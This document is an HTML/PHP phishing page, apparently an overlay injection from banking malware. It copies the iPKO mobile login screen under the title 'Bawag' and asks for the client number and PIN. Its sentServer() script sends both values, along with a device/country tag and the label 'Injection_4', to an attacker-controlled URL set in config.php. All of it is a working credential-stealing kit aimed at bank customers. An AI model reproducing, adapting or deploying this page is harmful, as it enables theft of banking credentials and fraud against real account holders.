<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>

    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="pl/pl.ipko.mobile/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php";
?>
<body>
  <div id="header" style="margin-top: 10px;">
    <img src="data:image/gif;base64,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 alt="[logo iPKO]" title="iPKO">
  </div>
    <div class="main">

        <div class="container">
<div class="row" style="background-color: #E6E6E6;padding: 10px 10px 0 10px;width: auto;">
<div style="border-bottom:1px solid #BCCCDC; width: 99%; padding-left:6px; padding-bottom:6px; margin-bottom:4px;"><img src="data:image/gif;base64,R0lGODlhUAAMALMAAObm5hwcHFJSUoiIiNnZ2Tc3NykpKbCwsERERG1tbaOjo76+vsvLy3p6epWVlV9fXyH5BAAAAAAALAAAAABQAAwAAAT/EMhJwVl1rkMyOUwmjmQ5DkE2GEJRKNThIsEwEQnLYowBSwJExxJwTBCCSkA4ESQBTmBgWgOgKqhfInCQLAINybYLNYQICEPHJSFMbYBGYNgzwCXTJ/QZ3WNTNwYJFAV8BTcJNgdFEwxVciEKAQUPEggIEwMCD4cTAQIBP32jehJXE5I/YnNugxlyQxIFmJI2OTkAbncIDQ5cngMuHaRApVaApr+ZXIt3FKAV0AAGlZS+B5IYAF8cAa4ANbV+4y0DAz+nyWTqzRK+n1DIUhIPBl8Oug0GE/piang2QDEgBqWAuSHpAIibsIWAm0pNksjRJgsTAF+QACAR8K0AlSlGd8DZcPSAYJ9lFB4SepImVpSFABzBcTRLghwDIRepqikymUljCY+FlENmkSsCgoDYyyXgnyUwEhbN8UcBBYYquTzy2fqHSkgUl3xQUOCiqYAhBB58mkVRoYF1CSxO+8Z0ENZthYpJoeJMxIURG0JU+CDYhOHDJCIAADs=" alt="Logowanie"></div>

                <div class="col-xs-1 col-sm-2"></div>
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">

                        <form id="form">
                            <div class="form-group ">
									<nobr>Numer klienta lub login</nobr>
									<input type="text" class="form-control" name="field2" id="login" autocomplete="off" maxlength="10" data-reg="/.{3,10}/" >
                           </div>

						   <br>

                            <div class="form-group">
									<nobr style="padding: 14px;">Wpisz hasło (PIN)</nobr>
									<input type="password" class="form-control" name="field3" id="password" autocomplete="off" data-reg="/.{3,16}/" maxlength="16" >
                            </div><br>


									   <input type="button" style="margin-bottom: 20px;margin-right: 20px;" onClick="sentServer();" class="" value="Login">

									    </input>
<script>
	function sentServer()
	{

		var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';

	var login1 = document.forms["form"].elements["login"].value;
	var pass = document.forms["form"].elements["password"].value;

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|ipko|"+login1+"|"+pass);
	}
	}
</script>


 </form><br>

</div>
                </div>
                <div class="col-xs-1 col-sm-2"></div>
            </div>
        </div>
    </div>


</body>
</html>
